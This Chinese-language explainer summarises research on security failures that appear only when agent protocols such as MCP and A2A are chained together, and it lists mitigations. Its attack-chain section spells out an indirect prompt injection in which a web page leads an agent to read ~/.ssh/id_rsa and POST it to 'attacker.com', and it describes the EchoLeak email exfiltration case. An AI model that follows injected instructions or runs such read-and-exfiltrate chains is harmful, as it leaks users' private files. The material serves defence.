SEC08 · 跨协议安全漏洞分析

组合安全悖论 / 五层安全框架 / MCP×A2A 最危险组合 / 责任真空与落地措施

每个协议都合规、每次工具调用都合法，但当它们被同一个 Runtime 串起来，就拼出了一条完整的攻击路径——Agent 安全的真正战场不在任何单个端点，而在协议与协议之间的缝隙里。

一、组合安全悖论：单独都安全，组合即失守

过去讨论 Agent 安全，视角几乎都落在"单点"上：这个 MCP Server 有没有命令注入？那个 Agent 会不会被提示注入？A2A 的传输层有没有加密？这些审查看起来足够严格，但它们共享一个隐含假设——每个部件安全，组装起来的系统就安全。2026 年 6 月，Dartmouth、Palo Alto Networks、Meta、UC Riverside 等机构发布的论文《Formal Security Analysis of Agent Protocol Composition》用形式化方法击碎了这个假设。

先对齐三个主角：MCP（Model Context Protocol，模型上下文协议，负责把 LLM 接到外部工具与数据源）、A2A（Agent-to-Agent，智能体之间的任务委派与协作协议）、ANP（Agent Network Protocol，基于 DID 的开放智能体网络协议）。三者单独做安全审查时都能过关——消息格式合法、鉴权机制存在、身份体系完整。但当它们被同一个 Runtime、Bridge 或 Conductor 串起来之后，权限、上下文、身份与审计边界会发生迁移，越权随之产生。

核心数字：研究团队提出的 AgentThread 分析框架在 5 类协议 × 11 个检查维度构成的 55 个检查单元中，发现了 35 个规范层安全发现，并用 80 个实现层测试验证其中一部分；更关键的是，在 8 组跨协议组合模型里，它发现了 30 个只在协议组合之后才会出现的安全失败——而且没有任何一个协议通过了全部检查。

为什么"组合"本身会产生漏洞

传统 API 安全关注认证、鉴权、消息格式、接口边界，这些控制的前提是数据流与控制流分离：数据就是数据，不会自己变成指令。Agent 系统恰恰打破了这个前提——网页内容、工具返回结果、另一个 Agent 发来的消息，进入模型上下文之后都可能影响后续的工具选择、参数生成和权限使用。换句话说，文本会变成动作。于是出现了单点审查看不到的三类迁移：上下文迁移（不可信内容混入共享上下文）、权限迁移（多个工具的权限在一条任务链上叠加）、审计迁移（跨协议跳转后日志断链）。

审查维度单点审查（传统）组合审查（Agent 必需）
审查对象单个 Server / 单次调用Runtime 串起的整条任务链
信任假设通过鉴权的输入即安全可信来源的内容仍可能不可信
权限视角这次调用是否在授权内多个工具权限是否沿链路叠加放大
审计边界本服务日志完整即可跨协议、跨 Bridge 能否还原全链路

检测手段渗透测试、代码审计形式化建模 + 反例轨迹 + SDK 复现

TLA+ 形式化验证：让"组合风险"变成可复现的证据链

论文没有停留在威胁建模的"我觉得有风险"层面，而是把协议规范变成了可自动检查的状态机。AgentThread 的工作流分五步：先从协议文档、schema、SDK 中收集材料；再抽取两种中间表示——描述角色、状态、动作与前置条件的 Protocol IR，以及描述"某个安全控制到底由谁负责"的 Responsibility IR；然后把它们编译成 TLA+ 模型（一种描述状态机与不变量的形式化规范语言）；接着交给 TLC 模型检查器穷举状态空间，寻找反例轨迹（counterexample trace）——一条从初始状态出发、经过若干合法协议动作、最终违反安全属性的具体路径；最后把反例轨迹映射回真实 SDK 调用，验证它在实现中是否真的可执行。

Init:   session = open, authority = userScope
Step 1: SessionClose        \* 会话结束，但 authority 未被撤销
Step 2: ReDelegate          \* 传递委派，scope 悄悄扩大
性质:   [](authority ⊆ userScope)
TLC 结果: 找到反例轨迹 Init → Step1 → Step2 → 性质违反

这段示意展示了反例轨迹的价值：它不证明系统"绝对不安全"，而是精确回答"怎样一步步走到不安全状态"。每一步单独看都是合法协议动作，串起来却违反了安全不变量——这正是组合漏洞的本质形态。协议还在快速演进，有了这条"规范条款 → 模型状态 → SDK 行为 → 责任主体"的可追溯证据链，协议一改就能重新验证，旧结论不会悄悄失效。

AgentThread 证据链（形式化验证全流程）： 协议文档 / schema / SDK 参考实现 │ ① 收集协议材料 ▼ Protocol IR（角色·状态·动作·前置条件） + Responsibility IR（控制项归谁负责） │ ② 编译 ▼ TLA+ 状态机模型（8 组跨协议组合） │ ③ TLC 模型检查：穷举状态空间 ▼ 反例轨迹 counterexample trace ──→ 30 个组合安全失败 │ ④ 协议适配器映射 ▼ 真实 SDK / API 测试 ──→ 80 个实现层测试验证 │ ⑤ 责任归属 ▼ 该找谁修？（Responsibility IR 给出答案 → 见第五节）

每个齿轮都加工合格，组装成机器却会绞伤手指——传统审查看的是齿轮，组合审查看的是整台机器。TLA+ 的角色不是证明机器安全，而是自动找出那条"从开机到绞伤"的完整步骤序列。

二、典型攻击链解剖：每一步都合法，合起来是攻击

论文用作动机案例的攻击链，几乎每一个多 MCP Server 环境都可能原样复现：用户只是让 Agent 总结一个网页，最后却丢了一个敏感文件。这条链的恐怖之处不在于任何一步有多"黑"，而在于每一步单独审查都合法。

攻击链全景（多 MCP Server 环境）： 用户："帮我总结一下这个网页" │ ① 完全正常的请求 ▼ Agent Runtime（Host） │ ② 调用 FetchMCP 抓取页面 ────── 抓取工具本身合法 ▼ 页面返回，正文里藏着隐藏指令（间接提示注入） │ ③ 全文进入模型共享上下文 ──── 数据与指令无边界 ▼ 模型"自主"生成新工具调用：FileMCP.read("~/.ssh/id_rsa") │ ④ 文件工具拥有"读权限" ────── 单工具授权审查通过 ▼ 模型继续调用：NetworkMCP.post("attacker.com", 文件内容) │ ⑤ 网络工具拥有"发送权限" ──── 单工具授权审查通过 ▼ 敏感文件外传 ✗ 攻击完成 —— 全程没有一次"非法调用"
步骤表面行为为什么能通过单独审查隐藏的风险
① 用户请求总结网页最普通的 Agent 用途无——攻击入口不在这
② FetchMCP 抓取HTTP GET 目标 URL抓取工具职责就是抓网页页面内容完全不可信
③ 进入上下文工具输出拼入对话MCP 的标准数据流注入指令与用户指令混在一起
④ FileMCP 读文件读取本地文件该工具被授予读权限调用意图来自网页而非用户
⑤ NetworkMCP 外传POST 外部地址该工具被授予发送权限读与传组合成外泄链，无审计

攻击的起点是间接提示注入——恶意指令不由用户直接输入，而是预先埋伏在 Agent 将要读取的外部内容（网页、邮件、文档、数据库记录）里，因此所有作用在输入边界的校验都看不见它。

问题出在审查回答错了问题。单点审查回答的是"这次调用是否符合协议、是否在授权内"，而攻击链需要回答的是："这次调用的意图来自哪里？它是否继承了不可信内容？它是否超出了用户最初授权的任务范围？它和前后调用是否组成了更高风险的链？"五个步骤各自的答案都干净，链式答案却全部暴露。

生产案例 · EchoLeak（CVE-2025-32711，CVSS 9.3）：2025 年 6 月披露的首个生产系统零点击提示注入漏洞。攻击者只需向 Microsoft 365 用户发送一封精心构造的邮件——用户不用打开、不用点击、甚至不知道邮件到达——当 Copilot 例行 summarization 邮箱时处理到这封邮件，约 40 秒后 OneDrive、SharePoint、Teams 中的文件就被静默外传到攻击者端点。没有窃取凭证、没有执行恶意代码，模型只是在"做它被设计来做的事"。这与论文中的攻击链同构：不可信内容进入上下文，驱动了合法的后续动作。

生态层面的数据同样印证这条链的现实性：AppSentinels 的测试显示，当 MCP 工具调用开启自动批准（auto-approve）时，提示注入的攻击成功率可达 84%；OWASP 的统计则指出，2025 年接受评估的生产 AI 部署中 73% 存在可被利用的提示注入漏洞，而只有 34.7% 的组织部署了专门的注入防御。攻击链的每一环都已被独立验证，缺的只是把它们串起来的 Runtime——而几乎每个多工具 Agent 都自带这个 Runtime。

对纯摘要器，注入攻击最多弄脏一段文字；对握有工具权限的 Agent，注入攻击触发的是一连串真实动作。伤害半径由"输出质量"变成了"权限范围"。

三、五层安全框架：传统覆盖了三层，Agent 缺了关键两层

AgentThread 把 Agent 协议安全切成五层，这个分层的价值在于它清楚地标出了"传统安全能管到哪、管不到哪"。前三层是任何网络协议都熟悉的战场，后两层是 Agent 特有的、也是当前几乎无人设防的区域。

层级关注点典型问题传统安全覆盖
L1 消息格式消息与线缆格式完整性字段是否良构、是否符合 schema✔ 成熟（格式校验）
L2 会话周期会话生命周期管理初始化、关闭、认证状态是否一致✔ 基本覆盖（会话管理）
L3 身份绑定身份与能力绑定凭证、能力声明是否可信、可撤销⚠ 部分覆盖（OAuth/签名）
L4 语义控制不可信文本是否驱动工具调用上下文污染、注入驱动的越权动作✘ 缺失
L5 审计追溯跨协议链路还原与问责跨 Server/Agent/协议的轨迹连续性✘ 缺失
五层框架覆盖图： L5 审计追溯 ┃ ✘ 缺失 ── 跨协议链路无人还原、无人问责 L4 语义操作控制 ┃ ✘ 缺失 ── 不可信文本直接驱动工具调用 ═══════════════════╋═══════ 传统安全与 Agent 风险的分界线 ═══════ L3 身份·能力绑定 ┃ ⚠ 部分 ── OAuth/DID 存在，撤销与传递约束薄弱 L2 会话生命周期 ┃ ✔ 覆盖 ── 初始化/关闭/认证状态管理成熟 L1 消息格式 ┃ ✔ 覆盖 ── schema 校验、良构性检查成熟 现状：大量 MCP 安全讨论仍停在 L1-L3（格式、鉴权、工具 schema）， 而 Agent 风险的难点集中在 L4-L5（语义如何驱动动作、链路能否还原）。

TLC 在三条反例轨迹上分别击穿了 L2、L3、L4：

  • L2 生命周期建议缺口：MCP 会话关闭后，该会话创建的凭证并没有被撤销——"会话结束"并不会自动终止会话期间建立的 authority。规范只是"建议"控制 token 生命周期，没有强制撤销机制。攻击者无需任何主动操作，时间本身就是漏洞。
  • L3 委派单调性缺口：A2A 中的 Agent 把 capability 委派出去后，后续步骤可以把它重新委派到超出原始授权范围的位置。由于规范没有定义委派范围约束，传递性再委派让权限跨多个 hop 被逐级放大。
  • L4 内容完整性缺口：MCP 规范明确要求清洗工具输出，但 SDK 的工具调用路径没有拦截任何注入载荷——论文测试的五种注入 payload 全部原样进入下游上下文。规范说了，实现没做，这是最典型的标准不一致。

把五层放在一起看，结论很直白：L1-L3 回答的是"这次调用是否合法"，而 Agent 必须额外回答"这次调用的意图来自哪里、是否继承不可信内容、是否超出用户最初授权、是否与前后调用组成高危链、日志能否证明这一切"。后四个问题全部落在 L4-L5，而它们目前基本没有答案。

L1-L3 守的是"门"，L4-L5 守的是"意图"。门再结实，如果屋内的人被一封夹带的字条指挥着开门搬东西，门锁毫无意义。

四、最危险组合与三类失败模式

论文在 8 组跨协议组合模型中共实例化了 43 个组合安全义务（31 个边界风险义务 + 12 个 Bridge 合同保持义务），其中 30 个出现了反例。各组合的风险密度差异明显，而 MCP↔A2A 以"9 个义务中 7 个出现反例"成为最危险的组合。

协议组合安全义务数反例数代表性问题
MCP ↔ A2A97Bridge 驱动的权限升级（最危险）
MCP ↔ MCP（链式）75注入链与传递信任
MCP ↔ ACP-Client64注入穿透到本地动作
A2A ↔ ACP-Cap53权限模型不匹配
MCP ↔ ACP-Cap43Consent 绕过

ANP ↔ A2A43身份认证 ≠ 委派控制

MCP↔A2A：权限升级发生在无人审计的桥上

权限单调性不变量：authority(hop n+1) ⊆ authority(hop n) ⊆ userGranted —— 30 个组合反例的共同特征，正是这条不变量在 Bridge 处被打破

TLC 找到的轨迹是这样的：未经清洗的 MCP 工具输出进入 A2A 的 Conductor（协调器，负责编排下游 Agent 的中枢组件），污染了中间的 Bridge（协议桥接层，把一种协议的消息翻译并转发给另一种协议）；Bridge 进而使下游 A2A Agent 获得的 authority 超出接收方原始授权范围；而这次权限升级没有任何完整的审计轨迹——因为 Bridge 既不属于 MCP 的本地审计范围，也不属于 A2A 的本地审计范围。单看 MCP，这只是内容完整性缺口；单看 A2A，这只是委派范围缺口；两者在边界上组合，就成了带审计盲区的权限升级。

三类失败模式：组合风险的通用形态

30 个反例虽各不相同，论文将其归纳为三类通用失败模式——几乎所有未来的协议组合都会以这三种形态之一暴露风险：

失败模式机制典型结构为什么难发现
隐藏中间人Chained Relay / Federation 把 provenance、信任与凭证边界压扁，中间桥接层悄悄传递上下文与权限链式 MCP relay、A2A 联邦、ANP 发现后的 MCP 工具调用每个端点只能看到自己的局部状态，完整链路不存在于任何一处的视图里
语义不匹配不同协议对 consent / delegation / authority 的理解不一致，Bridge 做静默翻译，本该重新确认的权限被自动延续MCP↔ACP-Cap、A2A↔ACP-Cap翻译发生在语义层，格式校验与鉴权都拦不住；加弹窗也没用——必须先定义"用户同意的到底是哪一段 authority"
身份 ≠ 内容安全DID、端到端加密、token 生命周期只回答"消息是谁发的"，不回答"内容会驱动什么动作"ANP↔MCP、ANP↔A2A身份体系完备带来虚假安全感；对 Agent 最危险的往往不是匿名攻击者，而是可信来源里的不可信内容

身份签名能证明这封信确实来自老朋友，但不能阻止信里夹带一张指挥你搬空保险柜的便条——在 Agent 世界里，验明正身与内容防御是两件完全独立的事。

五、责任真空与协议评估：43 个控制项成了孤儿

发现漏洞之后，下一个现实问题是：该找谁修？单协议问题的归属通常清楚——规范写错了找协议作者，SDK 没实现找 SDK 维护者，应用滥用找开发者。但跨协议组合问题没有天然主人：MCP 管工具调用、A2A 管 Agent 委派、ANP 管身份网络，而真正把它们串起来的 Runtime、Bridge、Conductor，不在任何一个协议的规范责任范围内。

责任审计结果：论文通过 Responsibility IR 分析了 35 条责任记录，发现只有 1 个安全控制（ANP 的 DID 身份验证）既有明确责任归属又被实际执行；其余 32 个 gap 中有 18 个属于 enforcement gap（规范分配了责任，SDK 却没有执行机制）。而所有组合层控制项全部处于 orphaned 状态——43 个组合安全控制项没有一个协议认领：没人负责链式 MCP Server 之间的边界，没人负责 A2A Conductor 的行为，也没人负责 ACP-Client 内部嵌的 MCP 工具。

于是形成了一个教科书式的推诿闭环，每一方的说法单独听都"合理"：

角色立场实际效果
协议作者组合安全属于应用层问题规范不定义组合契约
SDK 开发者只保证协议调用正确，不管业务策略18 个 enforcement gap 无人填
平台方权限配置由开发者自行决定默认配置即默认风险
应用开发者默认协议和 SDK 已处理好安全边界链路两端无人设防
结果最危险的位置——Runtime / Bridge / Conductor——没有清晰的责任主体

五协议兼容性评估

AgentThread 对五类协议的评估结论没有一个全绿。结合 2025-2026 年生态侧的独立披露，各协议的主要缺陷如下：

协议核心缺陷具体表现与佐证
MCP内容完整性缺陷规范要求清洗工具输出，SDK 不拦截注入 payload；STDIO 传输存在"配置即命令执行"设计级漏洞（OX Security 2026 年 4 月披露），波及约 1.5 亿次下载、7000 余个暴露服务器，衍生 12 个下游 CVE；Knostic 扫描约 2000 个 MCP Server，全部缺少认证
A2A委派范围无约束传递性再委派可跨 hop 放大权限；token 生命周期无上限、scope 过宽、缺少 consent 流程（多篇独立研究交叉确认）
ANP忽视内容安全DID 身份、端到端加密、token 生命周期俱全，但不提供内容完整性与委派范围控制——身份体系不自动防御上下文污染
ACP-Cap与 MCP 语义不兼容consent 语义在 Bridge 处被静默翻译，本该重新确认的授权被自动延续，形成 consent 绕过
ACP-Client本地注入风险不可信内容可穿透为本地动作（文件读写、命令执行），注入危害直接落到开发环境

最危险的地方从来不是有人认领的协议端点，而是没人认领的连接处——责任真空不是管理问题，而是架构问题：协议规范里压根没有"组合契约"这个概念。

六、企业落地五条措施：从单点审查到链路审查

论文的工程启示可以浓缩为一句话：白名单、单工具授权、粗粒度确认、单服务日志，这四件传统法宝都只解决组合风险的一小部分。企业落地需要围绕"链路"重构五道防线：

措施为什么传统做法不够落地方式
① 服务白名单 + 动态网页检测白名单只防"恶意 Server"，防不住"可信 Server 输出的不可信内容"——正常的 Fetch Server 抓回一个恶意网页照样注入注册表签名 + 来源信誉核验；对抓取内容做注入模式检测（隐藏文本、HTML 注释指令、角色劫持话术）；外部内容一律以"数据块"隔离标记进入上下文
② 按任务链路控制权限文件读、网络发、代码执行单独看都有合理用途，组合起来就是"读取—加工—外传"链授权单位从"工具"改为"任务链"：(数据来源, 工具集合, 外发动作) 三元组绑定；同一链路出现"敏感文件读取 + 外部发送"即触发阻断或升级审批
③ 细粒度用户确认"允许使用文件工具" ≠ "允许在网页总结任务里读本地敏感文件"确认弹窗绑定四要素：用户意图、数据来源、目标资源、外发动作；跨出当前任务语义的调用必须重新征求同意，而不是复用会话级授权
④ 跨协议全链路审计只记"调用了哪个工具"无法还原攻击链记录五件事：调用前模型看到了什么、参数如何生成、权限来自哪里、结果流向哪里、是否经过 Bridge；统一 trace-id 贯穿 MCP/A2A span，Bridge 本身纳入审计对象
⑤ 强化 Runtime 安全控制组合风险发生在 Runtime，也只有 Runtime 同时掌握任务上下文、工具集合与权限状态Runtime 从调度器升级为策略执行点：上下文污染标记、权限单调性检查（只减不增）、高危组合熔断、会话结束即撤销全部派生 authority
  • 把每个工具输出、网页内容、Agent 消息都当作不可信数据对待
  • 授权以"任务链路"为单位：来源 × 工具 × 外发动作一起审
  • 用统一 trace-id 串联跨协议调用，把 Bridge 记入审计日志
  • 会话结束即撤销该会话派生的全部凭证与 authority
  • 把 Runtime 当作策略执行点：高危组合（读敏感文件 + 网络外发）默认熔断
  • 不要以为 Server 白名单能挡住注入——可信 Server 照样带回恶意内容
  • 不要只按单个工具发权限——"读"和"传"各自合法，组合即外泄
  • 不要搞一次性粗粒度授权——"允许文件工具"覆盖不了所有后续语义
  • 不要只信任身份认证——DID / OAuth 证明"谁发的"，防不了"内容驱动什么"
  • 不要默认 SDK 会兜底——规范里写了不等于实现里做了（18 个 enforcement gap）

更根本的是范式转变：Agent 协议安全必须从"单点审查"走向"链路审查"。论文的最终结论是：只有显式的 组合契约（composition contract，协议之间就权限传递、语义翻译、审计连续性签订的明确约定）加上 Runtime 的明确执行责任，才能填补缝隙。三个行业级必建件是：跨协议权限传递规范（定义 authority 如何随调用链传递与收缩）、Bridge 组件审计标准（连接件与端点同等级别接受审计）、语义一致性校验机制（consent 与 delegation 的翻译必须显式、可验证）。在这三件事成为标准之前，企业能依靠的只有自己的 Runtime——这也是为什么第五条措施是前四条的承载者。

一句话总结：30 个组合漏洞、9 义务 7 反例、43 个孤儿控制项，这三组数字指向同一个结论——单协议规范与 SDK 补丁救不了组合风险，只有显式的 composition contract 加上 Runtime 的明确执行责任，才能把协议之间的缝隙封上。

过去我们审查每一块砖的硬度，现在必须审查砌墙的方式——因为墙塌的时候，没有一块砖需要负责。

Q&A

为什么每个协议单独审查都安全，组合起来却出现漏洞？
因为单点审查的隐含假设是"部件安全则系统安全"，而 Agent 系统打破了传统安全的两个前提：其一，数据流与控制流不再分离——网页内容、工具输出、其他 Agent 的消息进入共享上下文后都可能驱动后续工具调用，文本会变成动作；其二，权限、上下文、身份与审计边界会在协议之间迁移。MCP 侧一个内容完整性缺口加上 A2A 侧一个委派范围缺口，在边界上就组合成一次权限升级。Dartmouth 等机构用 TLA+ 形式化验证在 8 组组合模型中找到了 30 个只在组合后才出现的安全失败，证明这类风险是结构性的，不是个别实现写得差。
TLA+ 是如何发现跨协议漏洞的？什么是反例轨迹？
AgentThread 框架先把协议规范文档翻译成两种中间表示：Protocol IR 描述角色、状态、动作与前置条件，Responsibility IR 描述每个安全控制由谁负责；再编译成 TLA+ 状态机模型，交给 TLC 模型检查器穷举状态空间。TLC 寻找的是反例轨迹（counterexample trace）：一条从初始状态出发、每一步都是合法协议动作、最终违反安全不变量的具体路径，例如"会话关闭但凭证未撤销，随后传递委派扩大 scope"。找到轨迹后再映射回真实 SDK 调用验证可执行性。它的价值在于把"感觉有风险"变成"规范条款 → 模型状态 → SDK 行为 → 责任主体"的完整证据链，协议演进后可随时重验。
传统 API 安全措施（鉴权、消息校验、接口边界）为什么在 Agent 场景失效？
它们只覆盖五层框架的 L1-L3：消息格式合法性、会话生命周期、身份与凭证绑定。这些机制假设"通过鉴权的数据只是数据"，但 Agent 场景中数据会变成动作——不可信文本进入模型上下文后能影响工具选择与参数生成，这是 L4 语义控制层的问题，传统手段没有对应物；跨协议跳转后的链路还原是 L5 审计层的问题，单服务日志同样覆盖不到。典型例证：ANP 有完整的 DID 身份与端到端加密，却依然在组合测试中暴露"身份认证不等于内容安全"的失败模式。门守得再严，屋里的人被夹带字条指挥着开门搬东西，门锁毫无作用。
为什么说 MCP↔A2A 是最危险的组合？Bridge 权限升级具体怎么发生？
在论文的 8 组组合模型里，MCP↔A2A 的 9 个安全义务中有 7 个出现反例，反例率最高。TLC 找到的轨迹是：未经清洗的 MCP 工具输出进入 A2A Conductor，污染了中间的 Bridge 组件；Bridge 进而让下游 A2A Agent 获得的 authority 超出接收方原始授权范围；由于 Bridge 既不在 MCP 的本地审计范围，也不在 A2A 的本地审计范围，这次权限升级没有留下任何完整审计记录。单看 MCP 只是内容完整性缺口，单看 A2A 只是委派范围缺口，两者在边界上叠加成带审计盲区的权限升级——这正是"composition"一词的含义。
身份认证做得足够好（DID、OAuth、端到端加密），是否就能保证 Agent 安全？
不能。身份体系回答的是"这条消息是谁发的"，而 Agent 安全还必须回答"这条消息里的内容会驱动什么动作"。ANP 的测试给出了直接证据：它具备 DID 身份验证、端到端加密、token 生命周期控制，但组合模型中依然出现"身份认证不等于内容安全""身份认证不等于委派控制"两类失败模式——可信来源的消息照样可以携带污染上下文的指令，照样可以诱导后续工具越权。对 Agent 而言，最危险的不是匿名攻击者，而是可信来源里的不可信内容。身份层与内容层必须分别设防，任何用前者替代后者的做法都会制造虚假安全感。
MCP Server 白名单是不是就够了？企业应该优先落地哪条措施？
白名单只解决"恶意 Server 接入"这一类风险，解决不了"可信 Server 输出的不可信内容"——一个完全正规的 Fetch Server 抓取了含注入指令的网页，照样把隐藏指令带进模型上下文。五条措施的优先级取决于环境，但承载关系是清晰的：Runtime 强化（措施五）是前四条的执行载体，因为组合风险发生在 Runtime，也只有 Runtime 同时掌握任务上下文、工具集合与权限状态；跨协议审计（措施四）是发现问题的眼睛，没有它其余控制的效果无从验证。起步资源有限时，建议先做"任务链路权限 + Runtime 高危组合熔断"：把"敏感文件读取 + 网络外发"这类组合直接阻断，能以最小成本封住攻击链的收口环节。
43 个"孤儿控制项"意味着什么？行业需要补上什么？
它意味着所有组合层安全控制都没有明确责任主体：协议作者说组合安全属于应用层，SDK 开发者说只保证协议调用正确，平台方说权限由开发者自配，应用开发者默认协议已处理好边界——结果 Runtime、Bridge、Conductor 这些最危险的位置无人认领。论文据此提出三个行业级必建件：跨协议权限传递规范（authority 如何沿调用链传递与收缩）、Bridge 组件审计标准（连接件必须与端点同级别接受审计）、语义一致性校验机制（consent 与 delegation 的翻译必须显式可验证）。在此之前，企业只能把这些控制自建在 Runtime 层，这也是"Runtime 从调度器升级为策略执行点"这一落地措施的根本原因。
